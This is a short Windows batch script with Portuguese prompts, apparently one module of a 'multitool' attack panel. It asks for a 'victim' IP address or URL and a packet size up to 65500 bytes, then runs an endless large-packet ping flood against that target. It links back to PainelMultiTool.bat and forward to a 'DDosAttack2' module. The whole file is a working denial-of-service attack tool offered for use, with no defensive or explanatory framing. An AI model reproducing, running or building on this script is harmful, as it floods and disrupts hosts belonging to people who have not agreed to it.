@echo off
set /p escolha=Qual ip ou url da vitima:
echo.
set /p escolha2=Quantos Bytes deseja enviar (O maximo e 65500): 
ping -l %escolha2% %escolha% -t
echo.
echo 1-voltar 2-proximo ataque
set /p escolha2=Para onde deseja ir:
if %escolha2% == 1 goto voltar
if %escolha2% == 2 goto continuar
:voltar
start PainelMultiTool.bat & exit
:continuar
start DDosAttack2 & exit
